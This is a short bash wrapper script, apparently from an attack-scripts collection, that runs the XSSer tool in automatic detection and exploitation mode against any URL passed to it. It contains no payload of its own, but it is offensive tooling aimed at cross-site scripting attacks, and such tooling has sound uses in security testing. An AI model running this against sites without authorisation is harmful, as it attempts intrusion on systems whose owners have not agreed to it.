#!/bin/bash
# attack-scripts/xss/xss_attack.sh

TARGET_URL="$1"

if [ -z "$TARGET_URL" ]; then
  echo "Usage: ./xss_attack.sh <target_url>"
  exit 1
fi

echo "[*] Running Xsser against $TARGET_URL"
# --auto : try auto detection/exploitation
# --verbose : for more logs
xsser -u "$TARGET_URL" --auto --verbose